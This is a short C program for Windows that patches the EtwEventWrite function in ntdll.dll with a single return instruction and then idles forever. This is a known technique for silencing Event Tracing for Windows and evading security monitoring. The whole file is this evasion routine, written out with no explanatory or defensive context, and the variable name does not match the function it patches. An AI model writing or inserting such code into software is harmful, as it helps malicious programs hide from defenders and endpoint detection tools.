#include <windows.h>

int main() {
	DWORD dwOld = 0;
	FARPROC ptrNtTraceEvent = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWrite");
	VirtualProtect(ptrNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &dwOld);
	memcpy(ptrNtTraceEvent, "\xc3", 1);
	VirtualProtect(ptrNtTraceEvent, 1, dwOld, &dwOld);
	while (1) {
        sleep(10000000);
    }
}
